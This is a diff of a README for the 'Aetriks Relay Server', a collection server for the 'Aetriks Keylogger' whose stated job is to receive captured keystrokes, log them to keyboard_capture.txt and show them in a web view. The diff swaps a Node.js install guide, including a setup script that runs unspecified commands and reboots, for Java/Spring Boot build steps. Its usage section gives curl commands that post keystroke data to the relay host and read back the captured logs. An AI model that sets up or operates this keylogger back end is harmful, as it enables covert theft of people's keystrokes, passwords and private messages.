@@ -6,67 +6,60 @@ The Aetriks Relay Server is a lightweight Express-based server designed to recei
 
 ## Features
 
-- **Keystroke Logging**: Receives keystroke data from the Aetriks Keylogger and logs it to a file (`keyboard_capture.txt`).
-- **Web Interface**: Provides a simple web interface to view logged keystrokes.
-- **API Endpoints**: Includes endpoints for logging keystrokes and advanced integrations.
-- **Lightweight**: Built using Node.js and Express, ensuring minimal resource usage.
-- **Customizable**: Easily configurable to change the listening port or extend functionality.
+- POST /api/keystrokes for logging key data
 
----
+- GET / for viewing formatted keystroke logs
 
-## Installation Guide (Linux)
+## Prerequisites
+- Java 17 or higher (java -version)
 
-### **Step 1: Clone the Repository**
+- Maven, or use the provided Maven Wrapper (./mvnw)
 
-1. Clone the Aetriks Relay Server repository:
-   ```bash
-   cd ~/Aetriks/
-   git clone https://github.com/frHimanshu/aetriks-relay.git
-   cd aetriks-relay
-   ```
+### Installation & Running
 
----
+- Clone the repository
 
-### **Step 2: Run the Setup Script**
-
-1. Run the setup script:
-   ```bash
-   python3 setup.py
-   ```
-   This will execute the commands listed in `commands.txt` to set up the environment.
-
-2. Reboot the system:
-   ```bash
-   sudo reboot
-   ```
-
----
-
-### **Step 3: Start the Server**
-
-1. Start the server:
-   ```bash
-   npm start
-   ```
-
-   The server will start and listen on port `8080` by default.
-
-2. Verify the server is running by checking the logs:
-   ```bash
-   App is listening on port 8080
-   ```
-
----
-
-## Configuration
-
-The server is pre-configured to listen on port `8080`. If you need to change the port, edit the `server.js` file:
-```javascript
-const port = 8080; // Change this to your desired port
+``` bash
+git clone <repo-url>  
+cd aetriks-relay-java  
 ```
 
+- Build and run
+``` bash
+mvn clean install  
+mvn spring-boot:run  
+```
+- Or using the Maven Wrapper:
+```bash
+./mvnw clean install  
+./mvnw spring-boot:run  
+```
+- Run the packaged application
+```bash
+java -jar target/aetriks-relay-java-0.0.1-SNAPSHOT.jar  
+```
+- Override default port (e.g. 9090):
+```bash
+java -jar target/*.jar --server.port=9090  
+```
+
+- Usage
+Log keystrokes
+
+```bash
+curl -X POST http://hostip:8080/api/keystrokes \
+  -H "Content-Type: application/json" \
+  -d '{"keyboardData":"your keystrokes here"}'
+```
+
+- View logs
+Open in browser or use:
+
+```bash
+curl http://hostip:8080/
+```
+- Monitor keystroke file
+```bash
+tail -f keyboard_capture.txt
+```
 ---
-
-## License
-
-This project is licensed under the MIT License. See the `LICENSE` file for details.
